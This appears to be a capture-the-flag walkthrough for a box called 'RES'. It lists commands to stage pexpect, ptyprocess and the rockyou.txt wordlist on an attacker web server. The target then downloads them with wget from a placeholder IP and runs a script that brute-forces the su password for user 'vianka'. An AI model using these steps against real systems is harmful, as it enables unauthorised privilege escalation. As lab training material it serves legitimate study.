<h2>Process for RES</h2>

--------------------------------------------------------------------
Target box need to meet 2 requirements for this script to work.
1) Current user needs to be able to run the su command.
2) Python3 needs to be installed.
--------------------------------------------------------------------

First you will need to make sure you have pexpect installed locally:

```
pip install pexpect
```

Then run the set of commands to cp the pexpect and ptyprocess folders:

```
find / -name 'pexpect' 2>/dev/null
cp -r /PATH .

find / -name 'ptyprocess' 2>/dev/null
cp -r /PATH .
```

Then ip the folders up with these command:

```
tar -zcvf pexpect.tar.gz pexpect
tar -zcvf ptyprocess.tar.gz ptyprocess
```

Copy rockyou.txt:
```
cp /usr/share/wordlists/rockyou.txt .
```

Then start a pthon web server:
```
python3 -m http.server 8080
```

On the res box run the following wget command while in the /var/www/html folder:
```
wget http://IP_ADDRESS:8080/main.py
wget http://IP_ADDRESS:8080/rockyou.txt
wget http://IP_ADDRESS:8080/pexpect.tar.gz
wget http://IP_ADDRESS:8080/ptyprocess.tar.gz
```

Now unzip the folders:
```
tar -xf pexpect.tar.gz
tar -xf ptyprocess.tar.gz
```

Now we can run the script:
```
ptyhon3 main.py -u vianka
```

In my test i got the password in about 30-40 seconds.
